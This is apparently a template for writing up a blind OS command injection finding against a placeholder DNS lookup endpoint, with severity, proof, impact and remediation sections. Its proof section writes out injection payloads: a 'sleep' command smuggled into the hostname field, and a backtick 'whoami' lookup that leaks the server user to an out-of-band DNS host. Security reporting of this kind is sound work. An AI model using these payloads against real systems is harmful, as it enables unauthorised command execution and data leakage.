# OS Command Injection Finding — Report Template

```markdown
## OS Command Injection (blind): <feature>

**Severity**: High/Critical (CVSS 8.8-9.8)
**Asset**: https://target.example.com/tools/dnslookup
**Type**: CWE-78 Improper Neutralization of Special Elements used in an OS Command

### Vulnerable parameter

POST field `hostname`, executed server-side via shell utility.

### Proof (non-destructive)

Time-based:
```
input: 127.0.0.1;sleep 7      -> TTFB 7.21s (3-run avg)
input: 127.0.0.1;sleep 0      -> TTFB 0.31s (control)
```

OOB-based:
```
input: `whoami`.d1e2.oast.pro
interactsh log: DNS query www-data.d1e2.oast.pro from 203.0.113.50
(target egress), evidence/oob_dns.png timestamped.
```

Execution context proven: user `www-data`, no env secret values captured
(env var NAMES listed only).

### Impact

- Arbitrary command execution as service account inside production pod.
- Read access demonstrated to /etc/passwd (excerpt) proving file read.
- Lateral reachability to internal Redis observed at banner level only.

### Remediation

1. Replace shell invocation with native library calls (no /bin/sh).
2. If unavoidable: strict allowlist validation of hostname format
   (regex ^[a-zA-Z0-9.-]+$) before interpolation; avoid sh -c string concat.
3. Run executor under dedicated low-priv user with no egress to metadata.
```
